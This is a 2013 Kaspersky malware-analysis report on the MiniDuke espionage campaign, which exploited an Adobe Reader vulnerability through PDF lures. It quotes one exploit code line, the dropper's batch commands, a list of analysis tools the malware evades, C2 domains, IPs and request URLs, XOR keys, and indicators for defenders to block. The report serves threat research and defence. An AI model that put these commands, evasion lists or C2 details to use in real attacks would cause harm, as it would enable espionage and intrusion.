    "plain_text": "# The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro\n Backdoor\n\n## (or ‘how many cool words can you fit into one title’)\n\n### Authors:  Costin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk Global Research and Analysis Team, Kaspersky Lab\n\n[On Feb 12th 2013, FireEye announced the discovery (http://blog.fireeye.com/research/2013/02/the-number-of-the-](http://blog.fireeye.com/research/2013/02/the-number-of-the-beast.html)\n[beast.html) of an Adobe Reader 0-day exploit which is used to drop a previously unknown, advanced piece of malware. We](http://blog.fireeye.com/research/2013/02/the-number-of-the-beast.html)\ncalled this new malware “ItaDuke” because it reminded us of Duqu and because of the ancient Italian comments in the\nshellcode copied from Dante Aligheri’s Divine Comedy.\n\nSince the original announcement, we have observed several new incidents using the same exploit (CVE-2013-0640), some of\nwhich were so unusual that we decided to analyze them in depth.\n\nTogether with our partner CrySyS Lab, we’ve performed a detailed analysis of these new incidents which indicate a new,\n[previously unknown threat actor. For their analysis, please read http://blog.crysys.hu/2013/02/miniduke/ . For our analysis,](http://blog.crysys.hu/2013/02/miniduke/)\nplease read below.\n\n[First of all, while the fake “Mandiant” PDF reports (see http://blog.seculert.com/2013/02/spear-phishing-with-mandiant-apt-](http://blog.seculert.com/2013/02/spear-phishing-with-mandiant-apt-report.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SeculertResearchLab+(Seculert+Research+Lab))\n[report.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SeculertResearchLab+(Seculert+Researc](http://blog.seculert.com/2013/02/spear-phishing-with-mandiant-apt-report.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SeculertResearchLab+(Seculert+Research+Lab))\n[h+Lab)) are just dirty hacks of the original exploit, these newer attacks appear to have been created by a 0-day toolkit that was](http://blog.seculert.com/2013/02/spear-phishing-with-mandiant-apt-report.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SeculertResearchLab+(Seculert+Research+Lab))\nused to build the original “Visaform Tukey.pdf” discovered by FireEye.\n\n\n-----\n\nThe new PDF attacks drop fake documents that are shown to the victim if the exploit is successfully executed. The documents\nrefer to a human rights seminar (ASEM) and Ukraine’s foreign policy and NATO membership plans:\n\n_Document used against the Hungarian target_\n\n\n-----\n\n_Document used against the Belgian target_\n\n\n-----\n\n_Document used against the Luxemburg target_\n\nThe MD5s for the documents used in this attack are:\n\n3668b018b4bb080d1875aee346e3650a action_plan.pdf (Country: Belgium)\n88292d7181514fda5390292d73da28d4 ASEM_seminar.pdf (Country: Hungary)\n3f301758aa3d5d123a9ddbad1890853b EUAG_report.pdf (Country: Luxembourg)\n0cdf55626e56ffbf1b198beb4f6ed559 report.pdf (Country: Spain)\ncf5a5239ada9b43592757c0d7bf66169 EUAG_report.pdf (Country: Belgium)\nc03bcb0cde62b3f45b4d772ab635e2b0 The 2013 Armenian Economic Association.pdf (Country: Belgium)\n\nThe JavaScript exploit code has been modified since the original attack. For instance, the function named “oTHERWISE” was\nrenamed to “q1w2e3r4t”. The function is later called in the code like this:\n\nNew exploit:\n\nvar sCIENZA = q1w2e3r4t(vOLENCI[sHOGG('ODNEDNERp',3329,7937)], gIRARSI);\n\nOlder (“Visaform Turkey.pdf”) exploit:\n\n\n-----\n\nvar sCIENZA = oTHERWISE (vOLENCI['pRENDENDO'], gIRARSI);\n\nIn addition, the JS code is now in compressed format, while the original sample had it in plaintext. The reason behind the\nchanges is probably to avoid detection by anti-malware products although this doesn’t prevent our product from detecting it\nheuristically as “HEUR:Exploit.Script.Generic”.\n\nThe shellcode contained in the PDF document is similar to that used in the documents carrying the “Itaduke” payload, with\nsome differences. For instance, after exploiting the vulnerability, it searches for a specific signature within the PDF file. While\nthe “Itaduke” shellcode was looking for “!H2bYm.Sw@”, the MiniDuke version uses a different signature, “@34fZ7E*p\\”.\n\n_Signature in the Itaduke PDF file_\n\n_Signature in the Miniduke PDF file_\n\nOnce the payload signature is found, it is decrypted with XOR and then decompressed using RtlDecompressBuffer API (LZNT1).\nThe resulting PE file is written to a temporary file and loaded using LoadLibary API.\n\nThe resulting dynamic library implements the second stage of installation. It contains two binary resources, 101 and 102.\nResource 101 is the main backdoor DLL component. It is written to the %AppData% directory and loaded using LoadLibary API.\nResource 102 is the decoy PDF document. It is written to the Internet cache directory and then opened using a simple BAT file:\n\nTASKKILL /F /IM acro*\nping -n 1 127.0.0.1>nul\nstart \"\" \"%path to decoy PDF document%\"\n\nThe filenames of the dropped files are hardcoded in their resources.\n\n_Beginning of the resource 101 with its filename_\n\n_Beginning of the resource 102 with its filename_\n\nInterestingly, the malware dropper contains the following paths:\n\n#### ● “c:\\src\\dlldropper\\Release\\L2P.pdb”.\n ● “C:\\src\\hellodll\\Release\\hellodll.pdb”. \n\n\n-----\n\nThese paths did not exist in the dropper of original PDF (“Visaform Turkey.pdf”).\n\nIf we are to trust the PE headers, the dropper was compiled on Feb 20, 2013:\n\n_‘Hungarian’ dropper compilation time - “Feb 20 10:51:16 2013”_\n\nThe backdoor used in the Hungarian case was compiled on “Feb 20 10:57:52 2013”, just minutes after the dropper was\ncreated.\n\nPerhaps the most unusual thing about these three new attacks is the malware they drop. In all the analyzed cases, the\ndropped malware is in the form of a 22,528 bytes DLL file. Parts of the malicious DLL file are encrypted with information\nrelated to the system configuration, which ensures it will only work properly on the victim’s system. If copied to another\ncomputer, the malware will be unable to function successfully.\n\nThe backdoor is written in “old school” assembler and is tiny by current standards - only 20 KB. This is most unusual for\nmodern malware, which can be several megabytes in size. It has a small decryptor at the beginning that decrypts the main\nbody. All three cases use different encryption keys. Another peculiarity is that the backdoor has no imports: all functions are\nscanned from memory and are called dynamically. It is also interesting that the first two Win32 APIs resolved and called by the\nunpacking stub are ntdll.LdrLoadDll and kernel32.VirtualProtectEx. These two functions are not called according to the\n“_stdcall” convention. Instead, a ‘jmp ebx’ instruction is executed after manually building the stack. Clearly some thought went\ninto creating anti-emulation and anti-scanning techniques with this malware.\n\n### Backdoor analysis\n\nThe backdoor has a single export, which for instance is named “JorNgoq” in the Hungarian case. When this export is called at\nload, the backdoor sets the “.rdata” section’s permissions to “RWX” and sets the mutex to a hardcoded string “nljhfdb”.\n\nThe entrypoint of the library (DllMain) is obfuscated and the main body of the malware is encrypted. The encryption is rather\nsimple: the “.rdata” section of the library is ROL’ed with a linear key and XOR’ed with a fixed key. Both keys are derived from\nthe length of the encrypted part.\n\n\n-----\n\n_Decryption loop in the obfuscated code._\n_0x4522 is the actual size of the encrypted part_\n\nOnce finished decrypting, the library proceeds to the real “main” function. The main part of the library is written in Assembler,\nin an “old-school” manner typical for low-level viruses. The code is position independent; it has no imports and resolves API\nfunction addresses by hash values of their names.\n\n.\n_Typical low-level malware programming style:_\n_passing strings as parameters via call, addressing API functions by hash values_\n\nThe backdoor maintains seven call addresses that each maintain their own block of functionality.\n\nThe first block calls GetAsyncKeyState twice, checking for a mouse click, which indicates user activity in the system. The second\nblock searches for all “*.exe” and “*.dll” files located in the %temp% directory. The third block fetches information about the\ninfected system with calls to gather information about the CPU, drive and the computername - these are used to decrypt the\nbackdoor’s main body, which is custom encrypted for each unique victim.\n\n\n-----\n\nThe fourth block attempts to maintain self-protection from malware analysis. Below is the list of tools (and VMware) that it\nattempts to identify and protect against. It fetches the list of running processes on the system and attempts to identify if these\ntools are among them:\n\napispy32.exe, apimonitor.exe, winapioverride32.exe, procmon.exe, filemon.exe, regmon.exe, winspy.exe, wireshark.exe,\ndumpcap.exe, tcpdump.exe, tcpview.exe, windump.exe, netsniffer.exe, iris.exe, comview.exe, ollydbg.exe, windbg.exe,\nodb.exe, ImmunityDebugger.exe, syser.exe, idag.exe, idag64.exe, petools.exe, vboxtray.exe, vboxservice.exe, procexp.exe,\nvmtools.exe, vmwaretray.exe, vmwareuser.exe\n\nIf any of the tools above are detected on the system, the malware will continue running on the system without further\ndecrypting its code and exhibiting any other functionality. This will prevent it from doing any outbound communications with\nTwitter accounts, as described below. In other words, it will attempt to appear non-functional, especially to automated\nanalysis, hiding its true nature behind its layers of encryption.\n\nUser agent strings for web browsers like Opera, Mozilla and Internet Explorer are decrypted and used for all Internet access.\nOddly, there are Linux versions included as well:\n\n(Windows NT 5.1; (Windows NT 6.0; (Windows; U; Windows NT 5.2; (X11; Linux i686; (X11; Linux x86_64; (compatible; MSIE\n6.0; Windows NT 5.0; (compatible; MSIE 7.0; Windows NT 6.0; (compatible; MSIE 9.0; Windows NT 6.1;WOW64) ;Trident/4.0) ;\nTrident/5.0) ; WOW64; Trident/5.0) ; SV1) )\n\nThe fifth and sixth code blocks are most interesting. They calculate the SHA1 of main system information which will be used in\nthe C2 interaction later.\n\nFollowing the SHA-1 hash generation, the backdoor will base64 encode its unique hash for later C2 communication.\n\nThe malware is activated upon reboot of the infected machine. To gain control at boot, it writes a randomly named LNK file to\nthe startup folder, which in turn calls the main body using rundll32:\n\n\n-----\n\n-----\n\nIn the picture above, the malware’s main body is stored as “stat.bin” (a randomly selected name) in the “Adobe” folder. The\nLNK file calls it only exported function, “ImqRgno”.\n\nOnce activated, the malware will first contact Twitter and look for posts from some very specific accounts. These accounts\nshould have posted an encrypted string which contains the magic identifier “uri!”, then an encrypted c2 string.\n\n\n-----\n\nWe presume many other Twitter accounts exist with similar parameters.\n\nThe encrypted “uri!” holds a different c2 for each version of the malware:\n\n|Attack location|Command & control server|C2 IP / location|path on C2|\n|---|---|---|---|\n\n\n-----\n\n|Hungary|arabooks[dot]ch|194.38.160.153 / Switzerland|/lib/index.php|\n|---|---|---|---|\n|Luxemburg|artas[dot]org|95.128.72.24 / France|/engine/index.php|\n|Belgium|tsoftonline[dot]com|72.34.47.186 / United States|/views/index.php|\n|(Multiple)|www[dot]eamtm[dot]co m|188.40.99.143 / Germany|/piwik/web/index.php|\n\n\nIt’s most likely that these websites have been hacked by the attackers and injected with the command and control PHP script.\n\n[Secondly, the malware will connect to “www.geoiptool.com” to obtain information about the victim’s location.](http://www.geoiptool.com/)\n\nInterestingly, the backdoor has another update/c2 functionality. It searches Google for a very specific string:\n\nThe string “lUFEfiHKljfLKWPR” which the malware seeks on Google\n\nThe pages found by the Google search may hold an update “uri” similar to the one from Twitter. We can assume the attackers\nwanted to have a second channel for updates in case the Twitter accounts are closed.\n\n\n-----\n\n### Stage 2\n\nThe “index.php” on the C2 serves a fake GIF file to the victim, depending on the parameters it receives. Here’s what one of\nthese GIF files looks like:\n\nHere’s one example of a malicious request for the C2 domain “arabooks*dot+ch”:\n\narabooks.ch/lib/index.php?ia=TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp[REMOVED]lhUDx\nvzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw==\n\nThe picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data,\nknown as ‘steganography’:\n\nAt offset 0x6a4 inside the GIF file, there is a hidden encrypted PE file. The encryption scheme used a DWORD key also stored in\nthe GIF file that is rotated. Effectively, this translates to an 8 byte long XOR key. The resulting encryption key used in the\nHungarian attack for instance is {0xD2, 0x2A, 0xA2, 0x27, 0x79, 0x95, 0x52, 0x2D}. In the Belgian attack, it is {0xC5, 0x5E, 0xEE,\n0xE5, 0x51, 0x11, 0x17, 0x7C}. For the Luxemburg attack, the key is {0x91, 0x18, 0x8C, 0xC1, 0x1C, 0xC9, 0x9C, 0xC9}.\n\n\n-----\n\n_Decrypted payload from the fake GIF file served by the C2_\n\nThe decrypted PE file (plugin / payload) is also written in assembler and, once again, it is encrypted with the same algorithm as\nthe backdoor originally deployed in the system. We refer to it as “stage 2”. The main backdoor body saves the plugin with\ndifferent names, for instance, it can be “xml.dat” and tries to run its only export using rundll. In our case, this didn’t appear to\nwork very well:\n\n\n-----\n\nSeveral different variants of the 2nd stage backdoors have been observed on the C2; they all perform similar functions but are\nencrypted with different keys and contact different C2s.\n\n### Command & control server information\n\nThe malware connects to several C2s depending on the information available on the control Twitter accounts or on Google.\nFor instance, on “artas*dot+org” it connects to “/engine/index.php”. Interestingly, the “img” subfolder allows listings and we\ncan see several variants of the backdoor encrypted as GIF files:\n\n\n-----\n\nOn “tsoftonline*dot+com”, the folder has the same structure:\n\nInterestingly, on “tsoftonline*dot+com” we have several other files with different kind of names and sizes. They are larger and\nfollow a different naming scheme: “*number+.gif”. We believe they are custom backdoors delivered only to specific victims by\nthe attackers. We refer to these as “stage 3”.\n\n\n-----\n\n### Stage 3\n\nWhile we were analyzing the samples, the attackers connected to the C2 and added a custom backdoor as “1109821546.gif”:\n\n\"http://tsoftonline.com/views/img/1109821546.gif\"\nHTTP/1.1 200 OK\nDate: Mon, 25 Feb 2013 12:34:13 GMT\nServer: Apache\nLast-Modified: Mon, 25 Feb 2013 10:59:49 GMT\nETag: \"7c8251-5190d-4d68a708d9340\"\nAccept-Ranges: bytes\nContent-Length: 334093\nContent-Type: image/gif\n\nThis custom backdoor, referred to as “stage 3”, is much bigger than the previous ones – 300K+ in size. This is because the\nattackers used large layers of obfuscation code, including UCL compression. So far, we have observed two variants of the 300K\n“stage 3” backdoor. The PE compilation timestamp for both is “Mon Jun 18 17:28:11 2012”. The number “1109821546” in the\nfilename refers to the unique victim ID. In this case, we were able to determine that the victim is based in Portugal.\n\nThe backdoor connects to the following C2 for instructions:\n\nnews[dot]grouptumbler[dot]com/news/feed.php\nIP: 200.63.46.23\n\nIt supports several commands, such as copy file, move file, remove file, make directory, kill process and of course, download\nand execute new malware.\n\nThe server at 200.63.46.23 is hosted in Panama:\n\n\n-----\n\nWe presume that it was hacked by the attackers and is currently used as a command server for the attacks.\n\nMD5 hashes for the known “Stage 3” backdoors:\n\n1e1b0d16a16cf5c7f3a7c053ce78f515 v1.ex_\n53db085a276ebbf5798ba756cac833ea v2.ex_\n\nIn addition to the ~300K “stage 3” backdoors, we’ve observed a 13K module (MD5:\n6bc34809e44c40b61dd29e0a387ee682).This module will connect to an IP in Turkey, get the response, decrypt it in memory\nand execute it. The C2 is:\n\n85.95.236.114\n\nThe module has a compilation timestamp of “Tue Nov 13 14:30:12 2012”.\n\n### Map of victims\n\nThe C2s maintain a detailed, encoded log of the victims connecting to the servers. The logs are available to anyone who knows\nthe exact filename. By collecting the logs from all the known command servers, we’ve discovered connections from several\nhigh profile networks belonging to:\n\n|Country|Network|\n|---|---|\n|Ukraine|Government, Private company|\n|Belgium|Possible Embassy / Government|\n|Portugal|Government|\n|Romania|Government|\n\n\n-----\n\n|Czech Republic|Government|\n|---|---|\n|Ireland|Government|\n|United States|Think tank(s), Research institute, Healthcare provider|\n|Hungary|Social foundation|\n\n\nBy analyzing the logs from the command servers, we have observed 59 unique victims in 23 countries:\nBelgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania,\nMontenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States.\nThe amount of high profile victims in this attack is notable and puts it on the same level with other advanced campaigns such\nas “Red October”.\n\n### Mitigation and recommendations\n\nTo protect against these attacks, we recommend that you:\n\n#### ● Update Java to the latest version or simply remove it from the system if not used\n ● Update Microsoft Windows and Office to the latest versions\n ● Update Adobe Reader to the latest version (see https://www.adobe.com/support/security/bulletins/apsb13-07.html) \n ● Block traffic to the following domains:\n\n ○ arabooks.ch\n ○ artas.org\n ○ tsoftonline.com\n ○ www.eamtm.com\n ○ news.grouptumbler.com\n ● Block traffic to the following IPs:\n\n ○ 200.63.46.23\n ○ 194.38.160.153\n ○ 95.128.72.24\n ○ 72.34.47.186\n ○ 188.40.99.143\n ○ 85.95.236.114\n ● Install a security solution capable of detecting these threats such as Kaspersky Internet Security 2013 and scan all\nemails and received documents\n\n#### ● Be wary of opening suspicious documents on your systems; instead, use another computer without an Internet\nconnection, a VM, or upload the document to Google Docs for viewing\n\nIn addition, infected PDFs contain the following string, which can be used as a quick way to find them: “@34fZ7E*p\\”\n\n### Conclusions\n\nBased on our experience, this is a unique and very strange attack. The many different targets hit in separate countries,\ntogether with the high profile appearance of the decoy documents and the weird backdoor functionality indicate an unusual\n**threat actor. Some of the elements remind us of both Duqu and Red October, such as the minimalistic approach, hacked**\nservers, encrypted channels but also the typology of the victims.\n\n\n-----\n\nThe backdoor coding style reminds us of a malware writing group which is believed to be extinct: 29A. The value 29A in hex\nmeans 666, and perhaps not unsurprisingly, was also left by the attackers as a clue in the code:\n\nThe 29A / 666 clue left in the code by the attackers\n\n29A published their first malware magazine in December 1996 and were active until February 2008, when ‘Virusbuster’, the\nlast standing man announced the group’s dismissal.\n\nThe logs from the Command & Control servers indicate determination and quite a bit of success in compromising several high\nprofile entities in various countries. The stage 3 compilation timestamps indicate the attacker has been active for quite a\n**while but still managing to remain undetected.**\n\nPerhaps one of the most important questions is: are these attacks related to the “Itaduke” attack that prompted the discovery\nof the PDF 0-day? Or is it a separate entity that purchased the attack kit from the same source, which has a different agenda?\nOr, is it perhaps another threat actor which captured the 0-day exploit and modified it for other purposes? Unfortunately,\nthere are still many unanswered questions.\n\n_Note: We detect the malware described here as HEUR:Backdoor.Win32.MiniDuke.gen, Backdoor.Win32.Miniduke while the_\n_documents with exploits are detected as Exploit.JS.Pdfka.giy._\n\n### References:\n\n#### ● “In Turn it’s PDF Time”\n[http://blog.fireeye.com/research/2013/02/in-turn-its-pdf-time.html](http://blog.fireeye.com/research/2013/02/in-turn-its-pdf-time.html)\n\n#### ● “Duqu: Steal everything”\n[http://www.kaspersky.com/about/press/duqu](http://www.kaspersky.com/about/press/duqu)\n\n\n-----",
